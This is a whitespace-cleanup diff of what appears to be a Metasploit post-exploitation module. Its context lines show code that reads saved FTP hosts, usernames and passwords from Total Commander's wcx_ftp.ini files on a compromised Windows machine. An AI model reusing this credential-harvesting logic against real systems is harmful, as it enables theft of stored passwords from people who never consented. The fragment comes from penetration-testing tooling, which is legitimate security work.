@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Post
 				check_other(hklminstpath +'\\wcx_ftp.ini')
 			when /APPDATA/
 				print_status("Already Checked AppData")
-				
+
 			when /USERPROFILE/
 				print_status("Already Checked USERPROFILE")
 			else
@@ -100,7 +100,7 @@ class Metasploit3 < Msf::Post
 
 		rescue
 			print_status("#{filename} not found ....")
-		end	
+		end
 
 	end
 
@@ -113,7 +113,7 @@ class Metasploit3 < Msf::Post
 
 		rescue
 			print_status("#{filename} not found ....")
-		end	
+		end
 
 	end
 
@@ -136,7 +136,7 @@ class Metasploit3 < Msf::Post
 
 		rescue
 			print_status("#{filename} not found ....")
-		end	
+		end
 	end
 
 	def get_ini(filename)
@@ -148,7 +148,7 @@ class Metasploit3 < Msf::Post
 			next if group=="General" or group == "default" or group=="connections"
 			print_status("Processing Saved Session #{group}")
 			host = ini[group]['host']
-			
+
 			username = ini[group]['username']
 			passwd = ini[group]['password']
 			next if passwd==nil
@@ -166,7 +166,7 @@ class Metasploit3 < Msf::Post
 						:pass => passwd
 					)
 		end
-	end	
+	end
 
 	def seed(nMax)
 		@vseed = ((@vseed * 0x8088405) & 0xffffffff) +1
